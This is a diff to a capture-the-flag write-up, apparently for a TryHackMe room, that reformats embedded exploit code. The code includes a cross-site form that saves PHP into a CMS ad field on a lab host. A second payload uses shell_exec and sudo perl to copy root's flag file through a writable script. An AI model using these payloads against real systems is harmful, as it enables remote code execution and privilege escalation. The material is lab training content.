@@ -60,10 +60,10 @@ If we look at the exploit on Exploit-DB, it looks like the following:
         <form action="http://10.10.60.2/content/as/?type=ad&mode=save" method="POST" name="exploit">
             <input type="hidden" name="adk" value="hacked"/>
             <textarea type="hidden" name="adv">
-            <?php
-                echo '<h1> Hacked </h1>';
-            ?>
-            &lt;/textarea&gt;
+                <?php
+                    echo '<h1> Hacked </h1>';
+                ?>
+            </textarea>;
         </form>
     </body>
 </html>
@@ -92,14 +92,14 @@ Next, we can look at the file using `cat /home/itguy/backup.pl` and we see that 
         <form action="http://10.10.60.2/content/as/?type=ad&mode=save" method="POST" name="exploit">
             <input type="hidden" name="adk" value="hackedy hacked"/>
             <textarea type="hidden" name="adv">
-            <?php
-                echo "<pre>$output</pre>";
-                $output1 = shell_exec('echo "cat /root/root.txt > /etc/copy.sh"');
-                echo "<pre>$output1</pre>";
-                $output2 = shell_exec('sudo /usr/bin/perl /home/itguy/backup.pl');
-                echo "<pre>$output2</pre>";
-            ?>
-            &lt;/textarea&gt;
+                <?php
+                    echo "<pre>$output</pre>";
+                    $output1 = shell_exec('echo "cat /root/root.txt > /etc/copy.sh"');
+                    echo "<pre>$output1</pre>";
+                    $output2 = shell_exec('sudo /usr/bin/perl /home/itguy/backup.pl');
+                    echo "<pre>$output2</pre>";
+                ?>
+            </textarea>;
         </form>
     </body>
 </html>
@@ -112,8 +112,6 @@ All Done!
 ## Conclusion
 
 What a nice entry-level CTF and one of the first unguided ones I was able to, after going through almost all entry-level THM rooms mentioned [here](https://blog.tryhackme.com/free_path/) before, finish without looking at any writeups, or any external help myself!
-
-
 
 #### Resources
 
